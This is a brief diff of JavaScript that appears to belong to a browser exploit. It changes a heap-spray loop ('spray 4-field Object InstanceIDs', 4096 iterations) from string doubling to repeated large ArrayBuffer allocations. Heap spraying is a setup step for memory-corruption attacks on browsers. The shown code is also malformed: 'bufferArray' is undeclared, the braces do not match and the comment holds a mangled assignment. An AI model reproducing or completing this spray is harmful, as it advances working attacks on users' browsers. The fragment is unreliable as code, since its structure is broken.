@@ -19,10 +19,8 @@ function makeid() {
 var instancespr = [];
 
 for (var i = 0; i < 4096; i++) {
-        let largeString = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-            largeString += largeString;
-            if (largeString.length > 1000000000) {
-                largeString = "A".repeat(1000000);
+        bufferArray.push(new ArrayBuffer(1000000)); // Allocate large buffers 
+    if (bufferArray.length > 1000) { bufferArray = []; // Clear buffer array to prevent memory exhaustion
             }
         
      //= 50057; /* spray 4-field Object InstanceIDs */
